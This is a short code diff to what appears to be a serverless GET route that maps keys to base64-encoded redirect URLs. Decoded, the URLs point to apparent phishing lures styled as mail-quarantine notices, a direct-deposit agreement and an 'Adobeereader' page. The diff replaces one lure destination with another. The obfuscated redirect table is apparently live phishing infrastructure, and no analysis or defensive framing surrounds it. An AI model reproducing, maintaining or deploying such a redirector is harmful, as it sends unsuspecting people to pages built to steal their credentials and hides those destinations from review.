@@ -13,7 +13,7 @@ export async function GET(request) {
     "flight": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
     "mylinprotect.vercel.app": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
     "protecteds": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
-    "clint": "aHR0cHM6Ly9kaXJlY3QtZGVwb3NpdC1zaWduLWFncmVlbWVudC1nbG91eS5vbmRpZ2l0YWxvY2Vhbi5hcHAv",
+    "biss": "aHR0cHM6Ly9jZXR2b3JhLnZ1L0Fkb2JlZXJlYWRlcg==",
     "slightwaver": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
     "protector": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
     "quarantined-mail-cloud": "aHR0cHM6Ly9jbG91ZG1haWxwZW5kaW5nLnRvcD9LdGVoLU5ZPWRtRnBlSFJ4ZWc9PQ==",
